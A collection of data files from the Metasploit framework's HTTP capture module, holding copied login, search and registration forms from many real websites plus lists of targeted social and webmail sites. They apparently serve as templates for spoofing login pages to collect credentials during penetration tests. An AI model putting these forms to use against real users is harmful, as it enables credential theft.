{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wp.pl.txt", "content": "<form action='/s/szukaj.html' method='get' lang='pl'> <input name=\"szukaj1\" class=\"input\" type=\"text\" id=\"wpSzukaj1\" /><input class=\"btnSzukaj\" type=\"submit\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /></form><form action='http://firmy.wp.pl/szukajf.html' method='get' lang='pl'> <input name=\"szukaj\" class=\"input firma\" type=\"text\" id=\"wpSzukaj2\" value=\"\" /><input name=\"qcity\" class=\"input miasto\" type=\"text\" id=\"wpSzukaj2b\" value=\"\" /><input class=\"btnSzukaj\" type=\"submit\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /></form><form action='/s/szukaj.html' method='get' lang='pl'> <input name=\"szukaj3\" class=\"input\" type=\"text\" id=\"wpSzukaj3\" /><input class=\"btnSzukaj\" type=\"submit\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /></form><form action='/s/szukaj.html' method='get' lang='pl'> <input name=\"szukaj4\" class=\"input\" type=\"text\" id=\"wpSzukaj4\" /><input class=\"btnSzukaj\" type=\"submit\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /></form><form action='/s/szukaj.html' method='get' lang='pl'> <input name=\"typ\" checked=\"checked\" type=\"radio\" id=\"ogloszeniaTyp1\" value=\"\" onclick=\"newClass('szOMoto','');newClass('szONieru','off');newClass('szOPraca','off');dd('wpSzukaj6').focus();\" /><input name=\"typ\" type=\"radio\" id=\"ogloszeniaTyp2\" value=\"\" onclick=\"newClass('szOMoto','off');newClass('szONieru','');newClass('szOPraca','off');dd('wpSzukaj6b').focus();\" /><input name=\"typ\" type=\"radio\" id=\"ogloszeniaTyp3\" value=\"\" onclick=\"newClass('szOMoto','off');newClass('szONieru','off');newClass('szOPraca','');dd('wpSzukaj6c').focus();\" /><input name=\"marka\" class=\"input\" type=\"text\" id=\"wpSzukaj5\" value=\"\" /><input name=\"miasto\" class=\"input\" type=\"text\" id=\"wpSzukaj5b\" value=\"\" /><input name=\"zawod\" class=\"input\" type=\"text\" id=\"wpSzukaj5c\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /><input class=\"btnSzukaj\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:46.010657"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wretch.cc.txt", "content": "<form name='searchForm' action='http://tw.rd.yahoo.com/referurl/wretch/index/scrh/album/*http://tw.info.search.yahoo.com/search/wretch' method='get' id='searchForm'> <input class=\"btn\" type=\"submit\" id=\"sbtn\" value=\"\" /><input name=\"f\" type=\"hidden\" /><input name=\"ei\" type=\"hidden\" value=\"\" /><input name=\"fr\" type=\"hidden\" value=\"\" /><input name=\"searchtype\" type=\"hidden\" id=\"searchtype\" value=\"\" /><input name=\"q\" class=\"txt\" type=\"text\" id=\"stxt\" /></form>", "timestamp": "2025-10-24T23:41:46.359536"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wsj.com.txt", "content": "<form name='autocompleteHeaderForm'> <input name=\"hat_input\" autocomplete=\"off\" onkeydown=\"showHideCRDrpdwn('hide');\" class=\"unUsed\" type=\"text\" id=\"hat_input_auto\" value=\"\" onfocus=\"searchFieldOnFocus(this);setFocused(this);\" maxlength=\"80\" onblur=\"setFocused(null);showHideCRDrpdwn('show');\" /></form><form name='login_form' action='/login' method='post' id='login_form' onsubmit='suppress_popup=true;return true;' style='margin:0px;'> <input name=\"url\" type=\"hidden\" value=\"\" /><input name=\"user\" size=\"9\" type=\"text\" maxlength=\"30\" style=\"width:54px;font-size:9px;\" /><input name=\"password\" size=\"9\" type=\"password\" style=\"width:50px;font-size:9px;\" maxlength=\"30\" /><input name=\"savelogin\" checked=\"checked\" type=\"checkbox\" id=\"savelogin\" value=\"\" style=\"padding:0px;margin:0px;width:14px;height:13px;\" /><input name=\"img\" type=\"image\" src=\"\" alt=\"\" style=\"width:5px;height:9px;border:0px;\" /></form><form action='http://rej.careercast.com/properties/search/results.php' id='homeSearchForm' method='get' onsubmit='return OpenWin(http://rej.careercast.com/properties/search/results.php, homeSearchFormtarget);' target='homeSearchFormtarget'> <input name=\"qKeywords\" size=\"15\" class=\"p11\" type=\"text\" max=\"75\" value=\"\" /><input name=\"imageField\" type=\"image\" src=\"/img/hprightarrowNew.gif\" border=\"0\" height=\"18\" style=\"padding-left:3px;\" width=\"34\" /><input name=\"qAction\" type=\"hidden\" value=\"\" /><input name=\"qTerms\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:46.689220"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/wwe.com.txt", "content": "<form action='http://search.wwe.com/search' method='get'> <input name=\"q\" class=\"search\" type=\"text\" /><input name=\"search\" title=\"Search\" class=\"submit\" type=\"image\" src=\"/styles/v4/images/buttons/searchbutton.gif\" alt=\"Search\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /></form><form name='RFORM' method='post'> <input name=\"POA_ID\" type=\"radio\" value=\"\" /><input name=\"POA_ID\" type=\"radio\" value=\"\" /><input name=\"POA_ID\" type=\"radio\" value=\"\" /><input name=\"POA_ID\" type=\"radio\" value=\"\" /><input name=\"SUBMIT\" type=\"image\" src=\"\" id=\"pollsubmit\" value=\"\" height=\"20\" alt=\"Vote!\" onclick=\"javascript:submitForm(); return false;\" width=\"58\" /></form>", "timestamp": "2025-10-24T23:41:47.009208"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/www.care2.com.txt", "content": "<form action='/search/searchall.html'> <input name=\"q\" class=\"google_search\" type=\"text\" id=\"search_input1\" value=\"\" onfocus=\"autoFill(this);\" maxlength=\"255\" style=\"font-size: 11px; color: #555; width: 230px;\" /><input name=\"sa\" type=\"submit\" value=\"\" style=\"font-size: 11px; color: #555; font-weight: bold;\" /><input name=\"search\" type=\"hidden\" value=\"\" /></form><form action='/search/searchall.html'> <input name=\"q\" class=\"google_search\" type=\"text\" id=\"search_input2\" value=\"\" maxlength=\"255\" style=\"font-size: 11px; color: #555; width: 230px;\" /><input name=\"sa\" type=\"submit\" value=\"\" style=\"font-size: 11px; color: #555; font-weight: bold;\" /><input name=\"search\" type=\"hidden\" value=\"\" /></form><form action='/c2c/people/search.html' method='POST'> <input name=\"buttonSubmit\" type=\"hidden\" value=\"\" /><input name=\"name\" type=\"text\" id=\"search_input3\" value=\"\" onfocus=\"if (this.value=='name') { this.value=''; }\" style=\"font-size: 11px; color: #555; width: 226px;\" /><input name=\"sa\" type=\"submit\" value=\"\" style=\"font-size: 11px; color: #555; font-weight: bold;\" /></form><form action='http://www.google.com/custom' method='get'> <input name=\"q\" class=\"google_search\" type=\"text\" id=\"search_input5\" value=\"\" onfocus=\"if(this.value=='search petitions')this.value='';\" maxlength=\"255\" style=\"font-size: 11px; color: #555; width: 230px;\" /><input name=\"submit\" type=\"submit\" value=\"\" style=\"font-size: 11px; color: #555; font-weight: bold;\" /><input name=\"cof\" type=\"hidden\" value=\"\" /><input name=\"domains\" type=\"hidden\" value=\"\" /><input name=\"sitesearch\" type=\"hidden\" value=\"\" /></form><form action='http://www.care2.com/c2c/groups/search.html' method='POST'> <input name=\"q\" type=\"text\" id=\"search_input6\" value=\"\" style=\"font-size: 11px; color: #555; width: 230px;\" /><input name=\"submit\" type=\"submit\" value=\"\" style=\"font-size: 11px; color: #555; font-weight: bold;\" /></form><form action='/polls/vote?pollID=592' method='POST'> <input name=\"response\" type=\"radio\" id=\"poll_592_answer-0\" value=\"\" /><input name=\"response\" type=\"radio\" id=\"poll_592_answer-1\" value=\"\" /><input name=\"response\" type=\"radio\" id=\"poll_592_answer-2\" value=\"\" /><input name=\"response\" type=\"radio\" id=\"poll_592_answer-3\" value=\"\" /><input name=\"submit\" type=\"image\" src=\"\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:47.326961"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/www.xing.com.txt", "content": "<form name='usearchform' action='/app/search' method='get' id='usearchform'> <input name=\"op\" type=\"hidden\" value=\"\" /><input name=\"universal\" type=\"text\" id=\"search-field\" value=\"\" maxlength=\"255\" /></form><form name='registerform' action='https://www.xing.com/app/register' method='get'> </form><form name='loginform' action='https://www.xing.com/app/user' method='post'> <input name=\"op\" type=\"hidden\" value=\"\" /><input name=\"dest\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"login_user_name\" class=\"text\" type=\"text\" id=\"login_user_name\" maxlength=\"80\" style=\"width:99%;\" /><input tabindex=\"2\" name=\"login_password\" class=\"text\" type=\"password\" id=\"login_password\" maxlength=\"25\" style=\"width:99%;\" /><input name=\"perm\" tabindex=\"3\" class=\"fl\" type=\"checkbox\" id=\"perm\" /></form>", "timestamp": "2025-10-24T23:41:51.526407"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/www.yahoo.com.txt", "content": "<form name='sf1' action='r/sx/*-http://search.yahoo.com/search'> <input name=\"ei\" type=\"hidden\" value=\"\" /><input name=\"fr\" type=\"hidden\" value=\"\" /><input name=\"cop\" type=\"hidden\" value=\"\" /><input name=\"p\" size=\"20\" type=\"text\" id=\"p\" /><input type=\"image\" src=\"\" border=\"0\" value=\"\" alt=\"Web Search\" /></form>", "timestamp": "2025-10-24T23:41:51.859299"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/xanga.com.txt", "content": "<form class='Form1' action='http://www.xanga.com/default.aspx' id='SigninForm' method='post'> <input name=\"IsPostBack\" type=\"hidden\" id=\"IsPostBack\" /><input name=\"XangaHeader$txtSigninUsername\" tabindex=\"1\" type=\"text\" onmouseover=\"this.className='over';\" id=\"XangaHeader_txtSigninUsername\" onfocus=\"this.className='over';\" onmouseout=\"this.className='';\" maxlength=\"30\" onblur=\"this.className='';\" /><input name=\"XangaHeader$txtSigninPassword\" tabindex=\"2\" onkeypress=\"return SigninOnEnter(event);\" type=\"password\" onmouseover=\"this.className='over';\" id=\"XangaHeader_txtSigninPassword\" onfocus=\"this.className='over';\" onmouseout=\"this.className='';\" maxlength=\"16\" onblur=\"this.className='';\" /><input name=\"XangaHeader$chkSigninRememberPassword\" type=\"checkbox\" id=\"XangaHeader_chkSigninRememberPassword\" /></form>", "timestamp": "2025-10-24T23:41:52.511471"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/xboard.us.txt", "content": "<form action='login.php?do=login' method='post' onsubmit='md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)'> <input name=\"vb_login_username\" tabindex=\"101\" size=\"10\" class=\"text\" type=\"text\" id=\"navbar_username\" accesskey=\"u\" /><input name=\"cookieuser\" tabindex=\"103\" checked=\"checked\" type=\"hidden\" id=\"cb_cookieuser_navbar\" accesskey=\"c\" value=\"\" /><input name=\"vb_login_password\" tabindex=\"102\" size=\"10\" class=\"text\" type=\"password\" id=\"navbar_password\" /><input tabindex=\"104\" class=\"button\" title=\"Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself.\" type=\"submit\" accesskey=\"s\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"vb_login_md5password\" type=\"hidden\" /><input name=\"vb_login_md5password_utf\" type=\"hidden\" /></form><form action='search.php?do=process' method='post'> <input name=\"do\" type=\"hidden\" value=\"\" /><input name=\"quicksearch\" type=\"hidden\" value=\"\" /><input name=\"childforums\" type=\"hidden\" value=\"\" /><input name=\"exactname\" type=\"hidden\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"query\" tabindex=\"1001\" class=\"text\" type=\"text\" id=\"query\" style=\"width:265px;\" /><input tabindex=\"1004\" class=\"button\" type=\"submit\" value=\"\" /><input name=\"showposts\" tabindex=\"1002\" type=\"hidden\" id=\"rb_nb_sp0\" value=\"\" /></form><form action='index.php' method='get' onsubmit='return this.gotopage()' id='pagenav_form'> <input size=\"4\" class=\"bginput\" type=\"text\" id=\"pagenav_itxt\" style=\"font-size:11px\" /><input class=\"button\" type=\"button\" id=\"pagenav_ibtn\" value=\"\" /></form><form action='index.php' method='get'> </form>", "timestamp": "2025-10-24T23:41:52.845271"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/xbox.com.txt", "content": "<form name='aspnetForm' action='flexpage.aspx?NRMODE=Published&NRNODEGUID=%7bBFF19212-192F-4DF6-9FE8-3568DF0D8AFB%7d&NRORIGINALURL=%2fen-US%2f&NRCACHEHINT=Guest' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /></form><form action='http://www.xbox.com/en-US/search.aspx' method='get'> <input name=\"keyword\" class=\"XbcShellHeaderBrandSearchBox\" type=\"text\" id=\"ctl00__headerControl__searchBox\" maxlength=\"100\" /><input class=\"XbcShellHeaderBrandSearchSubmit\" type=\"image\" src=\"/xweb/xbox/images/spacer.gif\" /></form>", "timestamp": "2025-10-24T23:41:53.171386"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/xiaonei.com.txt", "content": "<form focus='email' action='http://login.xiaonei.com/Login.do' method='post' id='loginForm' onsubmit='getEl(email).value=Trim(getEl(email).value);'> <input name=\"email\" tabindex=\"1\" class=\"inputtext\" type=\"text\" id=\"email\" value=\"\" /><input name=\"password\" tabindex=\"2\" class=\"inputtext\" type=\"password\" id=\"password\" /><input name=\"autoLogin\" tabindex=\"3\" type=\"checkbox\" id=\"autoLogin\" value=\"\" /><input name=\"origURL\" type=\"hidden\" value=\"\" /><input name=\"submit\" tabindex=\"4\" class=\"subbutton\" type=\"submit\" id=\"login\" value=\"\" onclick=\"setLoginEmail();\" /></form><form action='/register.do' id='regForm' method='post'> <input name=\"name\" tabindex=\"5\" class=\"inputtext\" type=\"text\" id=\"name\" value=\"\" /><input name=\"pwd\" tabindex=\"6\" class=\"inputtext\" type=\"password\" id=\"pwd\" value=\"\" /><input name=\"repwd\" tabindex=\"7\" class=\"inputtext\" type=\"password\" id=\"repwd\" value=\"\" /><input name=\"regEmail\" tabindex=\"8\" class=\"inputtext\" type=\"text\" id=\"regEmail\" value=\"\" /><input name=\"universityid\" type=\"hidden\" id=\"universityid\" value=\"\" /><input name=\"universityname\" tabindex=\"13\" readonly=\"readonly\" class=\"inputtext short\" type=\"text\" id=\"universityname\" value=\"\" onclick=\"showpan();bodyclick=false;\" /><input name=\"highSchoolCode\" type=\"hidden\" id=\"highSchoolCode0\" value=\"\" /><input name=\"highSchoolName\" tabindex=\"3\" readonly=\"readonly\" class=\"inputtext short\" type=\"text\" id=\"highSchoolName0\" value=\"\" onclick=\"HighSchoolComponent.show(0);\" /><input name=\"workplacename\" type=\"hidden\" id=\"workplacename\" value=\"\" /><input name=\"workplaceid\" type=\"hidden\" id=\"workplaceid\" value=\"\" /><input name=\"gender\" type=\"radio\" value=\"\" /><input name=\"gender\" type=\"radio\" value=\"\" /><input name=\"icode\" tabindex=\"9\" size=\"5\" class=\"inputtext verify\" type=\"text\" id=\"icode\" maxlength=\"5\" /></form>", "timestamp": "2025-10-24T23:41:53.864014"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/xunlei.com.txt", "content": "<form name='gform1' action='http://www.google.cn/search' method='get' target='_blank' style='display: none'> <input name=\"q\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"oe\" type=\"hidden\" value=\"\" /><input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"channel\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:54.549331"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/yahoo.co.jp.txt", "content": "<form name='sf1' action='http://search.yahoo.co.jp/search'> <input name=\"fr\" type=\"hidden\" value=\"\" /><input name=\"tid\" type=\"hidden\" value=\"\" /><input name=\"ei\" type=\"hidden\" value=\"\" /><input name=\"p\" size=\"20\" type=\"text\" id=\"p\" /><input name=\"search\" title=\"\u30a6\u30a7\u30d6\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" alt=\"\u30a6\u30a7\u30d6\u691c\u7d22\" /><input name=\"tsearch\" title=\"\u767b\u9332\u30b5\u30a4\u30c8\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u767b\u9332\u30b5\u30a4\u30c8\" width=\"47\" /><input name=\"isearch\" title=\"\u753b\u50cf\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u753b\u50cf\" width=\"47\" /><input name=\"msearch\" title=\"\u52d5\u753b\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u52d5\u753b\" width=\"47\" /><input name=\"bsearch\" title=\"\u30d6\u30ed\u30b0\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u30d6\u30ed\u30b0\" width=\"47\" /><input name=\"dsearch\" title=\"\u8f9e\u66f8\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u8f9e\u66f8\" width=\"47\" /><input name=\"ksearch\" title=\"\u77e5\u6075\u888b\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u77e5\u6075\u888b\" width=\"47\" /><input name=\"csearch\" title=\"\u5730\u56f3\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u5730\u56f3\" width=\"47\" /><input name=\"psearch\" title=\"\u5546\u54c1\u691c\u7d22\" type=\"image\" src=\"\" border=\"0\" height=\"21\" alt=\"\u5546\u54c1\" width=\"47\" /></form>", "timestamp": "2025-10-24T23:41:55.203710"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/yahoo.com.cn.txt", "content": "<form name='ysearchform' class='topsrh-frm' action='http://cn.rd.yahoo.com/home/yhp2007/search/button/title/*http://search.cn.yahoo.com/search' method='get'> <input name=\"ei\" type=\"hidden\" value=\"\" /><input name=\"fr\" type=\"hidden\" value=\"\" /><input name=\"pid\" type=\"hidden\" value=\"\" /><input name=\"source\" type=\"hidden\" value=\"\" /><input name=\"p\" size=\"50\" type=\"text\" value=\"\" /></form><form name='login_form' autocomplete='off' action='https://edit.bjs.yahoo.com/config/login' method='post'> <input name=\".intl\" type=\"hidden\" value=\"\" /><input name=\".src\" type=\"hidden\" value=\"\" /><input name=\".done\" type=\"hidden\" id=\"loginToUrl\" value=\"\" /><input name=\".challenge\" type=\"hidden\" value=\"\" /><input name=\".cnrid\" type=\"hidden\" id=\"loginCnrid\" value=\"\" /><input name=\"login\" tabindex=\"1\" size=\"15\" class=\"inp\" type=\"text\" id=\"emailinput\" /><input name=\".savto\" checked=\"true\" tabindex=\"3\" type=\"radio\" id=\"to_standby\" onclick=\"onChoosePage('to_standby')\" /><input name=\".savto\" tabindex=\"4\" type=\"radio\" id=\"to_intoemail\" onclick=\"onChoosePage('to_intoemail')\" /><input name=\"c_pwd\" tabindex=\"1\" size=\"15\" class=\"inp\" type=\"text\" style=\"display:none;\" /><input name=\"passwd\" tabindex=\"2\" size=\"15\" class=\"inp\" type=\"password\" /><input name=\".persistent\" tabindex=\"5\" type=\"checkbox\" id=\"sav_stat\" /></form>", "timestamp": "2025-10-24T23:41:55.522933"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/yandex.ru.txt", "content": "<form action='http://yandex.ru/yandsearch' id='form'> <input name=\"text\" /><input type=\"submit\" value=\"\" onclick=\"p('next.search')\" /></form><form action='http://passport.yandex.ru/passport?mode=auth&retpath=http://mail.yandex.ru' method='post'> <input name=\"login\" id=\"l\" onfocus=\"clean(this)\" /><input name=\"passwd\" type=\"password\" id=\"s\" onfocus=\"clean(this)\" /><input name=\"twoweeks\" type=\"checkbox\" id=\"t\" value=\"\" /><input type=\"submit\" value=\"\" onclick=\"p('next.mail.login')\" /></form>", "timestamp": "2025-10-24T23:41:56.153708"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/yaplog.jp.txt", "content": "<form name='SelectUnpleasantForm' action='http://www.yaplog.jp/SelectUnpleasant.blog' method='post' target='unpleasantSelector'> <input name=\"blogUniqueId\" type=\"hidden\" value=\"\" /><input name=\"entryId\" type=\"hidden\" value=\"\" /><input name=\"fileName\" type=\"hidden\" value=\"\" /><input name=\"blogUniqueId\" type=\"hidden\" value=\"\" /><input name=\"entryId\" type=\"hidden\" value=\"\" /><input name=\"fileName\" type=\"hidden\" value=\"\" /><input name=\"blogUniqueId\" type=\"hidden\" value=\"\" /><input name=\"entryId\" type=\"hidden\" value=\"\" /><input name=\"fileName\" type=\"hidden\" value=\"\" /></form><form name='SearchQueryForm' action='/keyword/' id='SearchQueryForm' method='POST'> <input name=\"word\" size=\"30\" class=\"ipt\" type=\"text\" id=\"word\" value=\"\" onfocus=\"focusForm(this,1)\" style=\"height:20px;width:260px;\" onblur=\"focusForm(this,0)\" /><input class=\"btn_p\" type=\"submit\" value=\"\" /></form><form action='https://sso.gmo.jp/base/login.do' method='POST' onsubmit='return chkform(this);'> <input name=\"uid\" size=\"30\" class=\"ipt\" type=\"text\" onfocus=\"focusForm(this,1)\" style=\"width:150px;\" onblur=\"focusForm(this,0)\" /><input name=\"pass\" size=\"30\" class=\"ipt\" type=\"password\" onfocus=\"focusForm(this,1)\" style=\"width:150px;\" onblur=\"focusForm(this,0)\" /><input name=\"npara\" type=\"checkbox\" value=\"\" /><input name=\"submit\" type=\"image\" src=\"/image/regist/btn_login.gif\" value=\"\" alt=\"\u0192\u008d\u0192O\u0192C\u0192\u201c\" align=\"absmiddle\" /><input name=\"siteid\" type=\"hidden\" value=\"\" /><input name=\"loginurl\" type=\"hidden\" value=\"\" /><input name=\"failurl\" type=\"hidden\" value=\"\" /><input name=\"au\" type=\"hidden\" value=\"\" /><input name=\"sd\" type=\"hidden\" value=\"\" /></form><form action='http://www.yaplog.jp/ProfileSearchResults.blog' method='post'> <input name=\"memberId\" size=\"10\" class=\"ipt\" type=\"text\" value=\"\" maxlength=\"14\" style=\"width:156px;\" /><input name=\"blogName\" size=\"10\" class=\"ipt\" type=\"text\" value=\"\" maxlength=\"200\" style=\"width:156px;\" /><input name=\"blogerName\" size=\"10\" class=\"ipt\" type=\"text\" value=\"\" style=\"width:156px;\" maxlength=\"128\" /><input class=\"btn_search\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:56.506116"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/youku.com.txt", "content": "<form name='headSearchForm' action='http://so.youku.com/search_video' method='get' id='headSearchForm' onsubmit='return dosearch(this);'> <input name=\"q\" autocomplete=\"on\" class=\"txtSearch\" type=\"text\" id=\"headq\" value=\"\" onfocus=\"focusSearchTxt(this)\" maxlength=\"200\" onblur=\"blurSearchTxt(this)\" /><input name=\"searchdomain\" type=\"hidden\" value=\"\" /><input name=\"searchType\" type=\"hidden\" id=\"headSearchType\" value=\"\" /></form><form name='footSearchForm' action='http://so.youku.com/search_video' method='get' id='footSearchForm' onsubmit='return dosearch(this);'> <input name=\"q\" class=\"txtSearch\" type=\"text\" id=\"footq\" value=\"\" maxlength=\"200\" /><input name=\"searchdomain\" type=\"hidden\" value=\"\" /><input name=\"searchType\" type=\"hidden\" id=\"footSearchType\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:57.161850"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/yourfilehost.com.txt", "content": "<form class='topnav' action='http://www.flurl.com/search' method='get' style='margin: 0px' target='_blank'> <input name=\"site_id\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" /><input name=\"search\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:57.977822"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/zango.com.txt", "content": "<form name='aspnetForm' action='Default.aspx' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"ctl00$ucTabs$ucSearch$txtSearch\" tabindex=\"1\" class=\"searchBox\" type=\"text\" id=\"ctl00_ucTabs_ucSearch_txtSearch\" value=\"\" onfocus=\"if(this.value == 'Search Content'){ this.value = '';this.className += ' searchBoxBlank' }\" maxlength=\"50\" /><input name=\"ctl00$ucTabs$ucSearch$btnSearch\" tabindex=\"3\" class=\"btn\" type=\"submit\" id=\"ctl00_ucTabs_ucSearch_btnSearch\" value=\"\" onmousedown=\"this.className='btnDown'\" onmouseout=\"this.className='btn'\" /></form>", "timestamp": "2025-10-24T23:41:58.320835"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/zedge.net.txt", "content": "<form action='' id='search' method='post' onsubmit='zSearch();return false;' accept-charset='utf-8'> <input class=\"field\" type=\"text\" id=\"txt_query\" value=\"\" onfocus=\"if(this.value=='Search Zedge now!') { this.value=''; $('txt_query').setStyle('color', '#000'); }\" onblur=\"if(this.value=='') { this.value='Search Zedge now!'; $('txt_query').setStyle('color', '#ccc'); }\" /><input name=\"submit\" class=\"blackbutton\" type=\"submit\" value=\"\" onclick=\"phone_ctype=$('lst_content_type').options[$('lst_content_type').selectedIndex].value;\" /></form>", "timestamp": "2025-10-24T23:41:58.676576"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ziddu.com.txt", "content": "<form name='form_upload' enctype='multipart/form-data' action='../cgi-bin/uu_upload.pl?tmp_sid=ac64612cc331964436df72bff4295cdb' id='form_upload' method='post' style='margin: 0px; padding: 0px; display:inline;'> <input name=\"no_script\" type=\"hidden\" id=\"no_script\" value=\"\" /><input name=\"upfile_0\" size=\"24\" onkeypress=\"return handleKey(event)\" type=\"file\" id=\"upfile_0\" value=\"\" style=\"height:23px;\" /><input name=\"memail\" type=\"hidden\" id=\"memail\" value=\"\" /><input name=\"reset_button\" type=\"button\" id=\"reset_button\" value=\"\" onclick=\"resetForm();\" style=\"display:none;\" /><input name=\"upload_button\" type=\"button\" id=\"upload_button\" value=\"\" onclick=\"uploadFiles();\" /></form>", "timestamp": "2025-10-24T23:41:59.025093"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/zol.com.cn.txt", "content": "<form name='search_frm' action='http://product.zol.com.cn/products/product_search.php' method='get'> <input name=\"keyword\" class=\"input_div\" type=\"text\" id=\"keyword\" value=\"\" /><input type=\"hidden\" id=\"current_id\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:59.716679"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/zshare.net.txt", "content": "<form name='upload' enctype='multipart/form-data' action='http://69.80.255.188:3000' method='POST'> <input name=\"file\" size=\"40\" class=\"input1\" type=\"file\" /><input name=\"TOS\" type=\"checkbox\" id=\"TOS\" value=\"\" /></form>", "timestamp": "2025-10-24T23:42:00.052739"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/sites.txt", "content": "\nadwords.google.com\nblogger.com\ncare.com\ncareerbuilder.com\necademy.com\nfacebook.com\ngather.com\ngmail.com\ngmail.google.com\ngoogle.com\nlinkedin.com\nlivejournal.com\nmonster.com\nmyspace.com\nplaxo.com\nryze.com\nslashdot.org\ntwitter.com\nwww.blogger.com\nwww.care2.com\nwww.careerbuilder.com\nwww.ecademy.com\nwww.facebook.com\nwww.gather.com\nwww.gmail.com\nwww.google.com\nwww.linkedin.com\nwww.livejournal.com\nwww.monster.com\nwww.myspace.com\nwww.plaxo.com\nwww.ryze.com\nwww.slashdot.org\nwww.twitter.com\nwww.xing.com\nwww.yahoo.com\nwww.ziggs.com\nxing.com\nyahoo.com\nziggs.com\n", "timestamp": "2025-10-24T23:42:00.693484"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/social.txt", "content": "www.twitter.com\ntwitter.com\nwww.myspace.com\nmyspace.com\nwww.facebook.com\nfacebook.com\nwww.slashdot.org\nslashdot.org\nwww.livejournal.com\nlivejournal.com\nblogger.com\nwww.blogger.com\ngather.com\nwww.gather.com\nziggs.com\nwww.ziggs.com\nplaxo.com\nwww.plaxo.com\nwww.care2.com\ncare.com\nxing.com\nwww.xing.com\nwww.linkedin.com\nlinkedin.com\nwww.ryze.com\nryze.com\necademy.com\nwww.ecademy.com\nwww.careerbuilder.com\ncareerbuilder.com\nwww.monster.com\nmonster.com\n\n", "timestamp": "2025-10-24T23:42:01.028421"}
